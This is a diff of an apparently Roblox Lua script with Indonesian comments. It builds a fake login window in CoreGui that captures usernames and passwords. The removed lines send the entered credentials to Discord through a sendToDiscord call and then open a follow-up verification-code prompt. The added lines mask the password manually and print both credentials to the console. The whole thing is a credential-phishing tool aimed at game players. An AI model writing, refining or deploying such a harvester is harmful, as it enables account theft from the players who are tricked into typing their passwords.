@@ -179,9 +179,12 @@ local function createLoginGUI()
     local passwordBox = Instance.new("TextBox")
     local loginButton = Instance.new("TextButton")
 
+    -- Variabel untuk password asli
+    local password = ""
+
     -- Properti GUI
     gui.Name = "LoginGUI"
-    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+    gui.Parent = game:GetService("CoreGui")
 
     -- Frame
     frame.Name = "LoginFrame"
@@ -226,7 +229,18 @@ local function createLoginGUI()
     passwordBox.TextSize = 14
     passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    passwordBox.Password = true -- Teks tersensor
+
+    -- Penyensoran Manual
+    passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
+        local currentText = passwordBox.Text
+        if #currentText > #password then
+            local newChar = currentText:sub(#password + 1, #password + 1)
+            password = password .. newChar
+        elseif #currentText < #password then
+            password = password:sub(1, #currentText)
+        end
+        passwordBox.Text = string.rep("*", #password)
+    end)
 
     -- Login Button
     loginButton.Name = "LoginButton"
@@ -238,17 +252,12 @@ local function createLoginGUI()
     loginButton.TextSize = 16
     loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    loginButton.Visible = true
 
     -- Fungsi Login Button
     loginButton.MouseButton1Click:Connect(function()
-        local username = usernameBox.Text
-        local password = passwordBox.Text
-        if username ~= "" and password ~= "" then
-            sendToDiscord("Username: " .. username .. "\nPassword: " .. password)
-            print("Login berhasil! Username:", username)
+        if usernameBox.Text ~= "" and password ~= "" then
+            print("Username:", usernameBox.Text, "Password:", password)
             gui:Destroy()
-            createLoadingGUI(2, function() createVerificationCodeGUI() end) -- Memanggil GUI verifikasi kode setelah loading
         else
             print("Harap isi username dan password!")
         end
